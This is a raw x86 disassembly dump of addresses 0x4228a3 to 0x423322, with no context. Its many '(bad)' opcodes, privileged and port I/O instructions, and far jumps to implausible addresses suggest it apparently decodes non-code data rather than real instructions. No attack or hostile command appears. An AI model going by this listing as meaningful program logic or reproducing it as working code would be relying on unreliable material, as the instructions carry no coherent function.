  4228a3:	adc    BYTE PTR [ebx+0x4],dl
  4228a6:	xor    DWORD PTR [edi+0x1],ebp
  4228a9:	add    BYTE PTR [edi],al
  4228ab:	add    DWORD PTR [eax],eax
  4228ad:	add    BYTE PTR [edi+edi*4],al
  4228b0:	and    eax,0x2e378883
  4228b5:	xchg   esp,eax
  4228b6:	cwde   
  4228b7:	xchg   esi,eax
  4228b8:	outs   dx,BYTE PTR cs:[esi]
  4228ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228bb:	(bad)  
  4228bc:	out    0x14,eax
  4228be:	cli    
  4228bf:	stos   DWORD PTR es:[edi],eax
  4228c0:	pop    ecx
  4228c1:	fstp   DWORD PTR ds:0x377dfe2e
  4228c7:	in     eax,0x78
  4228c9:	loop   0x422897
  4228cb:	inc    ebp
  4228cc:	adc    bh,BYTE PTR [edx-0x80]
  4228cf:	enter  0xdff8,0xb4
  4228d3:	xor    BYTE PTR [ebx-0x78],0xba
  4228d7:	test   eax,0x8b477cd
  4228dc:	imul   eax,DWORD PTR [edi-0x6f2d94b0],0x62a966f6
  4228e6:	push   ebx
  4228e7:	test   eax,0xb392057e
  4228ec:	sbb    eax,0x4ce6dafe
  4228f1:	loope  0x4228c7
  4228f3:	jbe    0x4228f6
  4228f5:	test   cl,bl
  4228f7:	and    dh,BYTE PTR [eax]
  4228f9:	ss push esi
  4228fb:	pop    es
  4228fc:	rol    eax,cl
  4228fe:	arpl   ax,di
  422900:	adc    DWORD PTR [ebx+0x76765437],esp
  422906:	jno    0x422900
  422908:	repz rol BYTE PTR [eax-0x11],1
  42290c:	sub    DWORD PTR [eax+0x7e],edx
  42290f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422910:	imul   ebx,DWORD PTR [ecx],0x6181bbcc
  422916:	jno    0x422993
  422918:	add    dl,al
  42291a:	stos   BYTE PTR es:[edi],al
  42291b:	loop   0x4228f0
  42291d:	daa    
  42291e:	adc    BYTE PTR [edx+0x63],bl
  422921:	outs   dx,BYTE PTR ds:[esi]
  422922:	and    ch,dh
  422924:	mov    cl,BYTE PTR [ecx-0x144c9d3]
  42292a:	jne    0x42290a
  42292c:	jp     0x422953
  42292e:	xchg   ecx,eax
  42292f:	xor    esi,DWORD PTR es:[ebx+eax*8-0x68]
  422934:	jo     0x422994
  422936:	rcr    BYTE PTR cs:[esi-0x32],0xf3
  42293b:	sbb    BYTE PTR [ebx],0x25
  42293e:	cli    
  42293f:	(bad)  
  422940:	fsub   QWORD PTR [esi-0x63f80efa]
  422946:	pop    esi
  422947:	or     eax,0xcb0eb9ae
  42294c:	mov    BYTE PTR [ebx-0x45],bl
  42294f:	push   eax
  422950:	mov    ah,bl
  422952:	push   0x2a
  422954:	xor    eax,0x17c71e2e
  422959:	hlt    
  42295a:	iret   
  42295b:	add    eax,0x7d3d088d
  422960:	adc    esp,esp
  422962:	adc    cl,bh
  422964:	push   ecx
  422965:	aaa    
  422966:	inc    ebx
  422967:	pop    edi
  422968:	push   ss
  422969:	mov    dh,0x53
  42296b:	(bad)  
  42296c:	dec    edx
  42296d:	xchg   edi,eax
  42296e:	mov    ebx,gs
  422970:	(bad)  
  422971:	mov    edx,0xbf5032b3
  422976:	call   0xd869:0x1f041ade
  42297d:	test   al,0x3d
  42297f:	(bad)  
  422980:	mov    ds:0xf6573575,eax
  422985:	push   eax
  422986:	adc    DWORD PTR [eax],esp
  422988:	sub    ebp,esp
  42298a:	sub    DWORD PTR [edx+0x7f],0x53
  42298e:	cmp    DWORD PTR [ecx-0x65f20e63],eax
  422994:	add    al,0x0
  422996:	adc    DWORD PTR ds:0xfa0cf599,eax
  42299c:	fimul  DWORD PTR [esi-0x67a626cb]
  4229a2:	(bad)  [eax+0x34]
  4229a5:	in     eax,dx
  4229a6:	inc    esp
  4229a7:	mov    eax,0x5ad02964
  4229ac:	mov    eax,0x39525c50
  4229b1:	(bad)  
  4229b2:	enter  0xdf3a,0x0
	...
  422a16:	xchg   esi,eax
  422a17:	push   0x18
  422a19:	mov    ah,bh
  422a1b:	cli    
  422a1c:	xchg   esi,eax
  422a1d:	jle    0x422a63
  422a1f:	rol    ecx,1
  422a21:	call   0x88496d66
  422a26:	cmp    BYTE PTR [eax+0x1],dh
  422a29:	add    BYTE PTR [edi],al
  422a2b:	add    DWORD PTR [eax],eax
  422a2d:	add    BYTE PTR [eax+eiz*8-0x6a],bh
  422a31:	popa   
  422a32:	sub    eax,ebx
  422a34:	inc    ebx
  422a35:	adc    esi,esi
  422a37:	or     ebx,edx
  422a39:	sub    ebx,DWORD PTR [edx-0x1c]
  422a3c:	push   cs
  422a3d:	int3   
  422a3e:	push   ebp
  422a3f:	push   0xffffffb8
  422a41:	(bad)  
  422a42:	(bad)  [edi+0xe461552]
  422a48:	and    eax,0x9b622ac3
  422a4d:	inc    ebp
  422a4e:	and    BYTE PTR [ecx-0x3a],bh
  422a51:	test   DWORD PTR [eax],ecx
  422a53:	fwait
  422a54:	and    DWORD PTR [esi],ebp
  422a56:	in     eax,dx
  422a57:	inc    ebx
  422a59:	push   ds
  422a5a:	sti    
  422a5b:	xlat   BYTE PTR ds:[ebx]
  422a5c:	push   cs
  422a5d:	inc    ecx
  422a5e:	or     al,0x24
  422a60:	push   esp
  422a61:	push   esi
  422a62:	(bad)  
  422a63:	ds ret 0x4b0f
  422a67:	and    edx,edi
  422a69:	dec    esp
  422a6a:	ins    BYTE PTR es:[edi],dx
  422a6b:	test   BYTE PTR [esi-0x6ede2d58],0xfe
  422a72:	or     BYTE PTR [eax+eax*4+0x13e38aa8],dh
  422a79:	daa    
  422a7a:	in     al,dx
  422a7b:	mov    DWORD PTR [esp+eax*4-0x4d],0x4d7cffab
  422a83:	call   0x98e0:0xbf85938e
  422a8a:	loope  0x422aff
  422a8c:	les    esi,FWORD PTR [ebp+0x2b678b4f]
  422a92:	cs ret 
  422a94:	xchg   DWORD PTR [esi-0x1d],ecx
  422a97:	mov    al,0xd9
  422a99:	out    0x21,al
  422a9b:	fnstenv [ecx-0x836f78d]
  422aa1:	in     eax,0xf7
  422aa3:	jmp    0x2707:0x8aa7e86e
  422aaa:	mov    cs,WORD PTR [ecx+eiz*2+0x73cdf68c]
  422ab1:	inc    esi
  422ab2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422ab3:	seta   BYTE PTR [esi-0x49]
  422ab7:	mov    esi,0xbeb5805f
  422abc:	inc    edx
  422abd:	and    al,0xec
  422abf:	push   edx
  422ac0:	ja     0x422a55
  422ac2:	cmp    al,0xba
  422ac4:	or     bh,bl
  422ac6:	push   eax
  422ac7:	popa   
  422ac8:	dec    esp
  422ac9:	pminsw mm7,mm1
  422acc:	fldcw  WORD PTR [esp+eax*1]
  422acf:	push   esp
  422ad0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422ad1:	cli    
  422ad2:	iret   
  422ad3:	fbld   TBYTE PTR [ebx+0x1f]
  422ad6:	dec    ebp
  422ad7:	push   cs
  422ad8:	je     0x422b29
  422ada:	push   edi
  422adb:	jl     0x422aab
  422add:	xor    DWORD PTR [ecx+0x62fe9c9a],ebp
  422ae3:	lods   al,BYTE PTR ds:[esi]
  422ae4:	enter  0xd68d,0x5b
  422ae8:	in     al,dx
  422ae9:	sbb    esi,DWORD PTR [ebp+0x5621c70c]
  422aef:	pop    ss
  422af0:	(bad)
  422af4:	rcl    BYTE PTR [ecx],1
  422af6:	sbb    BYTE PTR [ebx-0x5f],cl
  422af9:	adc    DWORD PTR [edx],esi
  422afb:	ret    
  422afc:	into   
  422afd:	mov    dh,0x31
  422aff:	or     edi,DWORD PTR [esi+0x4bb0ed07]
  422b05:	push   esi
  422b06:	shl    DWORD PTR [ecx-0x11a4985b],1
  422b0c:	je     0x422b4b
  422b0e:	inc    esp
  422b0f:	xor    DWORD PTR [esi],ebp
  422b11:	pushf  
  422b12:	mov    esp,0xeecef4cf
  422b17:	pop    esi
  422b18:	aaa    
  422b19:	outs   dx,BYTE PTR ds:[esi]
  422b1a:	ja     0x422ae7
  422b1c:	sbb    al,0x3b
  422b1e:	stc    
  422b1f:	mul    DWORD PTR [edx]
  422b21:	(bad)  
  422b22:	lods   al,BYTE PTR ds:[esi]
  422b23:	fcmove st,st(2)
  422b25:	fs jmp 0x422ada
  422b28:	pop    esi
  422b29:	rol    dh,cl
  422b2b:	repnz leave 
  422b2d:	sti    
  422b2e:	inc    esp
  422b2f:	push   ebx
  422b30:	in     al,dx
  422b31:	test   al,0x92
  422b33:	adc    eax,0xa6
	...
  422b94:	add    BYTE PTR [eax],al
  422b96:	inc    esp
  422b97:	aaa    
  422b98:	dec    edx
  422b99:	fwait
  422b9a:	jnp    0x422b9b
  422b9c:	aad    0xff
  422b9e:	push   cs
  422b9f:	adc    ebx,DWORD PTR [ecx-0x674a3de4]
  422ba5:	repnz aas 
  422ba7:	jno    0x422baa
  422ba9:	add    BYTE PTR [edi],al
  422bab:	add    DWORD PTR [eax],eax
  422bad:	add    bl,dl
  422baf:	daa    
  422bb0:	mov    bl,0x37
  422bb2:	mov    dh,BYTE PTR [edi-0x1eb1f019]
  422bb8:	and    BYTE PTR [ebp-0x3336ab53],ah
  422bbe:	jp     0x422b65
  422bc0:	cmp    al,0x5
  422bc2:	clc    
  422bc3:	inc    ebx
  422bc4:	fstp   QWORD PTR [eax+ebx*4+0x32]
  422bc8:	rcl    BYTE PTR [edx],0x6
  422bcb:	stos   DWORD PTR es:[edi],eax
  422bcc:	pop    ecx
  422bcd:	pop    edx
  422bce:	test   al,0xc8
  422bd0:	jno    0x422b88
  422bd2:	in     eax,dx
  422bd3:	xor    DWORD PTR ds:0x5f2afee,ebp
  422bd9:	dec    edx
  422bda:	addr16 (bad) 
  422bdc:	sar    bh,cl
  422bde:	jl     0x422bbd
  422be0:	xor    eax,0xfe76d2ef
  422be5:	imul   esi,DWORD PTR [esi-0x1bc50ccf],0x2bce45ad
  422bef:	sub    BYTE PTR [ebp-0x12a3e316],bl
  422bf5:	pop    ss
  422bf6:	xor    bh,0xf4
  422bf9:	and    cl,ch
  422bfb:	sub    ecx,DWORD PTR [edx+0x45]
  422bfe:	and    eax,0xfd00dd93
  422c03:	aas    
  422c04:	mov    al,0x3
  422c06:	scas   al,BYTE PTR es:[edi]
  422c07:	outs   dx,DWORD PTR ds:[esi]
  422c08:	adc    DWORD PTR [ecx+0x37],ebx
  422c0b:	add    dh,BYTE PTR [ecx]
  422c0d:	xchg   ecx,eax
  422c0e:	cmp    dl,BYTE PTR [ecx]
  422c10:	jb     0x422c4b
  422c12:	mov    ah,0x80
  422c14:	cmp    al,0xed
  422c16:	aad    0xad
  422c18:	add    al,0x84
  422c1a:	loop   0x422be9
  422c1c:	or     bl,BYTE PTR [edx+0x19]
  422c1f:	nop
  422c20:	rcl    ah,1
  422c22:	ins    DWORD PTR es:[edi],dx
  422c23:	mov    ebx,0x1f8c842f
  422c28:	xchg   ebx,eax
  422c29:	mov    DWORD PTR [edi+0x4b],ebp
  422c2c:	push   0x2c
  422c2e:	add    ah,bl
  422c30:	out    0x34,al
  422c32:	or     dl,ah
  422c34:	sti    
  422c35:	xchg   ebx,eax
  422c36:	dec    edi
  422c37:	cmp    al,ah
  422c39:	xchg   esi,eax
  422c3a:	adc    esp,DWORD PTR [eax+0x4b]
  422c3d:	xchg   ecx,eax
  422c3e:	and    cl,BYTE PTR [edi]
  422c40:	je     0x422c05
  422c42:	test   cl,bh
  422c44:	ins    BYTE PTR es:[edi],dx
  422c45:	adc    eax,0xbfde334d
  422c4a:	sub    ch,BYTE PTR [eax+0x703b83fd]
  422c50:	outs   dx,DWORD PTR ds:[esi]
  422c51:	pop    edi
  422c52:	arpl   WORD PTR [ecx-0x2f],di
  422c55:	mov    ebp,0xc25884
  422c5a:	jbe    0x422c83
  422c5c:	ror    DWORD PTR [edx],1
  422c5e:	mov    al,ds:0x185f623b
  422c63:	scas   eax,DWORD PTR es:[edi]
  422c64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422c65:	pop    eax
  422c66:	xchg   ecx,eax
  422c67:	jno    0x422beb
  422c69:	pop    edi
  422c6a:	mov    ch,0xe4
  422c6c:	sti    
  422c6d:	mov    ah,0x78
  422c6f:	mov    cl,0x72
  422c71:	inc    eax
  422c72:	imul   ecx,DWORD PTR ds:0x192b63a1,0xffffffd4
  422c79:	bound  ebx,QWORD PTR [esi-0x3781dfdc]
  422c7f:	int3   
  422c80:	cdq    
  422c81:	dec    edx
  422c82:	daa    
  422c83:	sbb    ch,BYTE PTR [edi+0x1e4a9cef]
  422c89:	push   edi
  422c8a:	bound  esp,QWORD PTR ds:0x7a7e3b90
  422c90:	jo     0x422c74
  422c92:	jmp    0xacf0795d
  422c97:	mov    ds:0x7ae13074,al
  422c9c:	pop    edx
  422c9d:	imul   ecx,DWORD PTR [ecx-0x708fd528],0x7077ae80
  422ca7:	adc    bl,BYTE PTR [eax]
  422ca9:	stos   DWORD PTR es:[edi],eax
  422caa:	dec    edi
  422cab:	aas    
  422cac:	push   eax
  422cad:	push   ecx
  422cae:	sbb    BYTE PTR [ecx-0x79edada4],cl
  422cb4:	fld    DWORD PTR [eax]
	...
  422d16:	mov    edi,0x626d60bd
  422d1b:	std    
  422d1c:	mov    edi,0x26c593ff
  422d21:	fist   WORD PTR [ebp+ebx*1+0x1]
  422d25:	jns    0x422d6d
  422d27:	jb     0x422d2a
  422d29:	add    BYTE PTR [edi],al
  422d2b:	add    DWORD PTR [eax],eax
  422d2d:	add    bl,dl
  422d2f:	sub    eax,0x3a7963e8
  422d34:	add    DWORD PTR cs:[ebx+0x6544ea65],ebp
  422d3b:	sub    bh,cl
  422d3d:	nop
  422d3e:	aas    
  422d3f:	shl    DWORD PTR [edi-0x28],0x72
  422d43:	mov    esi,0xad23f4bf
  422d48:	adc    eax,0xe2eb7784
  422d4d:	mov    ah,0x9
  422d4f:	dec    ebp
  422d50:	sar    BYTE PTR gs:[ebp+0x5649166f],cl
  422d57:	sbb    al,0xe7
  422d59:	in     eax,0xcb
  422d5b:	jo     0x422cfd
  422d5d:	jmp    0xe974:0x77a2c95b
  422d64:	push   ebx
  422d65:	jmp    0xfb374ea1
  422d6a:	xor    cl,BYTE PTR [edx-0x3c486188]
  422d70:	adc    DWORD PTR [edx],ebx
  422d72:	jmp    0x94659253
  422d77:	mov    eax,0x286bab97
  422d7c:	mov    ebx,0x8624ba96
  422d81:	push   cs
  422d82:	test   al,0x6c
  422d84:	sub    DWORD PTR [esi+0x3879fd15],0x3f5b8b88
  422d8e:	or     eax,0x1e7043b5
  422d93:	push   edi
  422d94:	push   0x2ea78206
  422d99:	and    ebx,DWORD PTR [ecx+0x6bc0e7d8]
  422d9f:	cli    
  422da0:	mov    esi,0x6bbfe7df
  422da5:	fldcw  WORD PTR [edi+0x1b]
  422da8:	std    
  422da9:	jmp    0x52335535
  422dae:	fcom   st(0)
  422db0:	cwde   
  422db1:	inc    ebp
  422db2:	push   edi
  422db3:	lock pop es
  422db5:	xchg   edx,eax
  422db6:	and    al,0x8b
  422db8:	jecxz  0x422e2d
  422dba:	test   DWORD PTR [ecx+ecx*4-0x58f74faa],esi
  422dc1:	dec    ebp
  422dc2:	fcom   QWORD PTR [edx+0x28204d74]
  422dc8:	fst    QWORD PTR [eax+0x54a623e]
  422dce:	les    ebp,FWORD PTR [edx+esi*2-0x9]
  422dd2:	jmp    0xf9292ca5
  422dd7:	in     eax,dx
  422dd8:	out    0x9a,eax
  422dda:	dec    edx
  422ddb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422ddc:	test   DWORD PTR [ebp+0x1d3afc0a],eax
  422de2:	xor    esi,0x3d7d0690
  422de8:	pop    edx
  422de9:	mov    ecx,0x32338e99
  422dee:	fisttp QWORD PTR [esi]
  422df0:	retf   0xb9ab
  422df3:	jle    0x422de9
  422df5:	icebp  
  422df6:	test   dh,0x86
  422df9:	call   0xb311:0xb3f4143e
  422e00:	mov    bh,0x55
  422e02:	jns    0x422e4f
  422e04:	test   al,0xfa
  422e06:	aaa    
  422e07:	sbb    eax,0x2707fd7b
  422e0c:	jmp    0x5fcdfac
  422e11:	out    0x7d,al
  422e13:	pop    esi
  422e14:	xor    bh,BYTE PTR ds:0xe6f3b2c5
  422e1a:	add    esp,ebx
  422e1c:	and    al,0xb3
  422e1e:	or     eax,0xe9f14e37
  422e23:	ror    cl,cl
  422e25:	ins    BYTE PTR es:[edi],dx
  422e26:	dec    ebp
  422e27:	add    esp,DWORD PTR gs:[ebp+0x15c2fd04]
  422e2e:	in     al,0xc8
  422e30:	fwait
  422e31:	mov    eax,ds:0x9cad26
	...
  422e96:	adc    DWORD PTR [ebp-0x78],0x19
  422e9a:	(bad)  
  422e9c:	xchg   ebx,eax
  422e9d:	fild   WORD PTR [edi-0x744d56f]
  422ea3:	jno    0x422eae
  422ea5:	add    DWORD PTR [ebp+0x73],ecx
  422ea8:	add    DWORD PTR [eax],eax
  422eaa:	pop    es
  422eab:	add    DWORD PTR [eax],eax
  422ead:	add    BYTE PTR [edx+0x4f],dh
  422eb0:	mov    ebp,DWORD PTR [esi+0x4d12faa7]
  422eb6:	out    dx,eax
  422eb7:	push   ecx
  422eb8:	aaa    
  422eb9:	mov    esi,0x1e3dc06a
  422ebe:	jb     0x422e52
  422ec0:	(bad)  
  422ec1:	fs repnz cmp dl,BYTE PTR es:[eax-0x40fc5210]
  422eca:	(bad)  
  422ecb:	mov    al,0x1b
  422ecd:	push   ecx
  422ece:	mov    edi,edi
  422ed0:	xchg   esp,eax
  422ed1:	int    0xab
  422ed3:	sbb    esp,DWORD PTR [ecx-0x1a47c357]
  422ed9:	sti    
  422eda:	aas    
  422edb:	jb     0x422f43
  422edd:	aas    
  422ede:	out    0x6a,eax
  422ee0:	and    cl,bl
  422ee2:	push   ecx
  422ee3:	cli    
  422ee4:	xchg   ebp,eax
  422ee5:	int    0x6c
  422ee7:	(bad)  
  422ee8:	cmp    bl,BYTE PTR [esi+0x22]
  422eeb:	mov    ecx,0xc592b86a
  422ef0:	dec    esp
  422ef1:	fbld   TBYTE PTR [ebx+0x6bc3eb01]
  422ef7:	movntq (bad),mm0
  422ef8:	out    0xc7,eax
  422efa:	enter  0xa31f,0x3a
  422efe:	(bad)  
  422eff:	mov    cl,0x88
  422f01:	adc    eax,0xdabda9a9
  422f06:	cld    
  422f07:	mov    al,ds:0x89710dbe
  422f0c:	retf   0xb6e6
  422f0f:	in     al,0x5f
  422f11:	push   0x43
  422f13:	mov    ebp,0x3776b968
  422f18:	mov    esp,0x12a70974
  422f1d:	and    eax,0xe3bad875
  422f22:	xor    BYTE PTR [esi-0x25],0x8
  422f26:	into   
  422f27:	icebp  
  422f28:	xlat   BYTE PTR ds:[ebx]
  422f29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422f2a:	dec    ecx
  422f2b:	je     0x422ec1
  422f2d:	xchg   ecx,eax
  422f2e:	sub    edi,DWORD PTR [ecx]
  422f30:	or     ecx,DWORD PTR [edi]
  422f32:	into   
  422f33:	jmp    0xe5b9f382
  422f38:	clc    
  422f39:	mov    ebx,DWORD PTR [ebx]
  422f3b:	pop    ss
  422f3c:	adc    bl,dl
  422f3e:	outs   dx,DWORD PTR ds:[esi]
  422f3f:	sbb    DWORD PTR [ecx+0x4bb81b42],esp
  422f45:	sbb    eax,0xad3d13f0
  422f4a:	sbb    DWORD PTR [ebx],esi
  422f4c:	jmp    0x213dd7a4
  422f51:	sbb    dh,dh
  422f53:	fld    TBYTE PTR [ecx-0x6def5bd2]
  422f59:	std    
  422f5a:	sar    bl,0x41
  422f5d:	ss inc esi
  422f5f:	or     eax,0x2301956a
  422f64:	int3   
  422f65:	mov    ebx,0x98d35bc
  422f6a:	fnstenv [edx]
  422f6c:	xchg   edx,eax
  422f6d:	xlat   BYTE PTR ds:[ebx]
  422f6e:	fsub   st(6),st
  422f70:	(bad)  
  422f71:	sahf   
  422f72:	or     ebp,DWORD PTR ds:0xdf88a221
  422f78:	sbb    dl,bl
  422f7a:	mov    WORD PTR [ebp-0x42a77ae8],gs
  422f80:	ds stc 
  422f82:	test   eax,0x64cdf0fb
  422f87:	dec    ebp
  422f88:	jno    0x422fce
  422f8a:	cmp    al,0x88
  422f8c:	mov    BYTE PTR [eax-0x44a193d7],dl
  422f92:	xor    esi,DWORD PTR [ecx]
  422f94:	sub    eax,0xe2200cca
  422f99:	push   esp
  422f9a:	push   cs
  422f9b:	stc    
  422f9c:	clc    
  422f9d:	(bad)  
  422f9e:	ja     0x422f41
  422fa0:	and    ebp,DWORD PTR [eax-0x7b98ff47]
  422fa6:	fwait
  422fa7:	cmp    ebx,esi
  422fa9:	add    al,0xb8
  422fab:	pop    eax
  422fac:	repz ret 0xcc25
  422fb0:	js     0x422fe0
  422fb2:	gs inc eax
  422fb4:	jl     0x422fb6
	...
  423016:	inc    esi
  423017:	in     al,0x62
  423019:	mov    dl,ah
  42301b:	mov    gs,esi
  42301d:	out    dx,al
  42301e:	lahf   
  42301f:	aaa    
  423020:	inc    ebp
  423021:	or     DWORD PTR [edi+0x18],ebx
  423024:	jne    0x422fca
  423026:	push   esp
  423027:	je     0x42302a
  423029:	add    BYTE PTR [edi],al
  42302b:	add    DWORD PTR [eax],eax
  42302d:	add    dh,ah
  42302f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423030:	mov    WORD PTR ds:0xd005d3ef,ds
  423036:	out    dx,eax
  423037:	jbe    0x423078
  423039:	inc    edi
  42303a:	jae    0x423008
  42303c:	inc    esp
  42303d:	or     dl,BYTE PTR [esi]
  42303f:	imul   esi,DWORD PTR [esp+eiz*8-0x64],0x1ff3de51
  423047:	xor    DWORD PTR [ecx],ecx
  423049:	mov    edi,0x5a5600c6
  42304e:	rcr    BYTE PTR [ecx+0x6c47a345],0xa5
  423055:	mov    edx,0xd773e7ca
  42305a:	out    0x31,al
  42305c:	lahf   
  42305d:	pop    ds
  42305e:	pop    edx
  42305f:	mov    ebp,0x3a60b30c
  423064:	adc    eax,0xfa7e5a7
  423069:	cmp    ebp,edi
  42306b:	hlt    
  42306c:	jns    0x42301b
  42306e:	loop   0x42300f
  423070:	mov    ds:0xbb51aaac,eax
  423075:	jp     0x42304c
  423077:	lea    edx,[ebx]
  423079:	popa   
  42307a:	jns    0x4230a4
  42307c:	push   edi
  42307d:	jb     0x423064
  42307f:	call   0x89e741ee
  423084:	sbb    eax,0x347ce18a
  423089:	popa   
  42308a:	sub    al,0x2b
  42308c:	std    
  42308d:	push   ebp
  42308e:	push   0x96f87052
  423093:	cmp    DWORD PTR [ecx+0x73176cd4],esi
  423099:	es shr eax,1
  42309c:	fwait
  42309d:	sti    
  42309e:	retf   0xa85e
  4230a1:	sub    eax,0x19014a48
  4230a6:	jae    0x423061
  4230a8:	mov    ch,dl
  4230aa:	pop    edi
  4230ab:	inc    ebp
  4230ac:	stos   DWORD PTR es:[edi],eax
  4230ad:	xor    bl,BYTE PTR [edi*4-0x382b8df9]
  4230b4:	loop   0x42312a
  4230b6:	ret    0x5e9b
  4230b9:	mov    ch,BYTE PTR [edx-0x50]
  4230bc:	test   dl,bl
  4230be:	mov    edx,0xd41ae0ce
  4230c3:	jmp    0x42305d
  4230c5:	rol    BYTE PTR [esi-0x5b],cl
  4230c8:	dec    eax
  4230c9:	add    DWORD PTR ds:[edx],ebx
  4230cc:	cmp    eax,0x49402ec8
  4230d1:	pusha  
  4230d2:	xchg   edi,eax
  4230d3:	sti    
  4230d4:	xchg   esp,eax
  4230d5:	mov    ds:0x9f40164a,al
  4230da:	dec    ebx
  4230db:	out    dx,eax
  4230dc:	push   es
  4230dd:	es xchg ecx,eax
  4230df:	jns    0x4230ce
  4230e1:	mov    ch,0x7d
  4230e3:	out    dx,al
  4230e4:	xchg   esi,eax
  4230e5:	pop    esp
  4230e6:	scas   eax,DWORD PTR es:[edi]
  4230e7:	lock and bh,BYTE PTR [eax+0x30fb38af]
  4230ee:	sub    BYTE PTR ds:0x72597930,bl
  4230f4:	int3   
  4230f5:	(bad)  
  4230f6:	and    ecx,esi
  4230f8:	mov    dl,BYTE PTR [esi]
  4230fa:	adc    DWORD PTR [edi-0x6bae2ef6],eax
  423100:	sbb    dl,dl
  423102:	or     bl,bh
  423104:	jmp    FWORD PTR [ebp+eiz*2+0x2e]
  423108:	sbb    al,0x18
  42310a:	out    dx,eax
  42310b:	mov    ch,ah
  42310d:	dec    eax
  42310e:	dec    esi
  42310f:	aad    0x53
  423111:	jle    0x423181
  423113:	ss inc esi
  423115:	repz pop edx
  423117:	adc    ah,BYTE PTR [ebx-0x6806620c]
  42311d:	sbb    al,0xa8
  42311f:	lods   eax,DWORD PTR ds:[esi]
  423120:	ficomp WORD PTR [ebp-0x6a]
  423123:	pop    esi
  423124:	in     eax,0x82
  423126:	outs   dx,DWORD PTR ds:[esi]
  423127:	jns    0x423182
  423129:	jl     0x423177
  42312b:	sub    bh,BYTE PTR [esi+esi*1]
  42312e:	or     DWORD PTR [edi],0x5d
  423131:	popa   
  423132:	mov    esp,0x4a7a
	...
  423193:	add    BYTE PTR [eax],al
  423195:	add    BYTE PTR [ecx-0xf],bh
  423198:	div    DWORD PTR [ecx-0x6804801]
  42319e:	dec    edi
  42319f:	jno    0x423168
  4231a1:	sub    BYTE PTR [ebp+0x5b918b1a],0x75
  4231a8:	add    DWORD PTR [eax],eax
  4231aa:	pop    es
  4231ab:	add    DWORD PTR [eax],eax
  4231ad:	add    ch,bh
  4231af:	lock in eax,dx
  4231b1:	sbb    eax,0x1770da32
  4231b6:	sub    BYTE PTR [esi],bl
  4231b8:	push   ds
  4231b9:	xor    ebx,DWORD PTR [edi-0x5b7bfa98]
  4231bf:	jecxz  0x423197
  4231c1:	(bad)  
  4231c2:	(bad)  
  4231c4:	bound  ebp,QWORD PTR [ebx+0x2bd121cd]
  4231ca:	pushf  
  4231cb:	dec    esp
  4231cc:	inc    eax
  4231cd:	jne    0x42317d
  4231cf:	lods   al,BYTE PTR ds:[esi]
  4231d0:	mov    cl,0x6f
  4231d2:	mov    WORD PTR [edi-0x2a],ds
  4231d5:	fdiv   st(5),st
  4231d7:	gs push 0x62545545
  4231dd:	sub    eax,0xb4b6165d
  4231e2:	mov    al,0x4a
  4231e4:	lds    edi,FWORD PTR [edx-0x62]
  4231e7:	sets   BYTE PTR [edx+0xdc504c4]
  4231ee:	adc    BYTE PTR [esi+0x36e125c6],ah
  4231f4:	test   DWORD PTR [ebp+0x4f8db35c],esp
  4231fa:	fs aam 0xc3
  4231fd:	sbb    ebp,ebx
  4231ff:	inc    ecx
  423200:	xchg   esi,eax
  423201:	dec    esp
  423202:	jnp    0x42325c
  423204:	shl    esi,1
  423206:	sahf   
  423207:	in     al,0xd5
  423209:	lea    ebx,[edx-0x15]
  42320c:	xchg   esi,eax
  42320d:	popa   
  42320e:	xor    DWORD PTR [edi+0x49],ebx
  423211:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423212:	mov    ebp,0x1d9d938b
  423217:	push   edx
  423218:	adc    eax,0xc1fc2f7e
  42321d:	xchg   ebx,eax
  42321e:	push   edx
  42321f:	pop    ebx
  423220:	aam    0x5d
  423222:	jne    0x42323d
  423224:	cmp    edx,edx
  423226:	pop    edx
  423227:	aad    0xfe
  423229:	cmp    al,0x9
  42322b:	je     0x4231b5
  42322d:	mov    ah,0xc
  42322f:	inc    ebp
  423230:	popa   
  423231:	cmp    ah,BYTE PTR [edi-0x64]
  423234:	mov    ch,0x3
  423236:	mov    eax,0x3f25410c
  42323b:	sub    edx,ebx
  42323d:	cdq    
  42323e:	icebp  
  42323f:	pop    esp
  423240:	mov    esp,0x9f168bb3
  423245:	cmp    eax,0x82b73a8b
  42324a:	(bad)  
  42324b:	cmp    esp,DWORD PTR [eax]
  42324d:	pusha  
  42324e:	xchg   ebp,eax
  42324f:	sbb    BYTE PTR [esi+0x3d],al
  423252:	jb     0x42328b
  423254:	stc    
  423255:	rol    ebp,1
  423257:	fild   QWORD PTR [ecx]
  423259:	mov    dl,0x44
  42325b:	push   esi
  42325c:	and    DWORD PTR [edx-0x3],ebx
  42325f:	push   cs
  423260:	xchg   edi,eax
  423261:	xchg   esi,eax
  423262:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423263:	dec    ebx
  423264:	ja     0x42323f
  423266:	aam    0x6c
  423268:	test   BYTE PTR [edi+0x2b],bl
  42326b:	xchg   esi,eax
  42326c:	cs jb  0x423206
  42326f:	xchg   edi,eax
  423270:	imul   ebx,DWORD PTR [esi+esi*2-0x3006dfb9],0x89afa5
  42327b:	jg     0x423260
  42327d:	cmp    al,0x3d
  42327f:	lods   al,BYTE PTR ds:[esi]
  423280:	int    0xae
  423282:	push   0x2e
  423284:	mov    es,WORD PTR [edi+0x52]
  423287:	jp     0x42323e
  423289:	adc    bl,ch
  42328b:	lea    ecx,[edx-0x196cef92]
  423291:	mov    WORD PTR [ecx+0xc6f4159],?
  423297:	retf   0x361c
  42329a:	sar    DWORD PTR [eax-0x36],1
  42329d:	js     0x4232aa
  42329f:	les    ecx,FWORD PTR [ebx]
  4232a1:	add    DWORD PTR ds:0x53b74430,eax
  4232a7:	inc    ebp
  4232a8:	inc    ebp
  4232a9:	jnp    0x423235
  4232ab:	dec    edi
  4232ac:	lea    ecx,[edi]
  4232ae:	or     ax,0xe3d1
  4232b2:	movntps XMMWORD PTR [ebp+0x0],xmm2
	...
  423315:	add    al,bh
  423317:	fisub  WORD PTR [edx+0x30]
  42331a:	mov    sp,0xdefa
  42331e:	xchg   edi,eax
  42331f:	inc    esp
  423320:	lock (bad) 
  423322:	hlt    
